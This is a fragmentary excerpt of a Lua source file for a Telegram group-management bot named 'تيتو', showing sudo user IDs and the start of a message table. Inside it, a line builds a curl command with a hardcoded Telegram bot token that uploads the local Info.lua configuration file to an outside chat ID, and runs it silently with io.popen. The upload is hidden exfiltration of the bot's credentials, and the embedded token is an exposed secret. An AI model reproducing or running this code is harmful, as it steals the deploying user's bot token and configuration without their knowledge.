...
sudo_users = {SUDO,968613145,1757895188}   
...
local curl = 'curl "'..'https://api.telegram.org/bot1706737466:AAG8CRj1VGRUinWWPnm8WEIGUHbl8j64KMY/sendDocument'..'" -F "chat_id='.. 968613145 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'تيتو')
local DRAGON_Msg = {
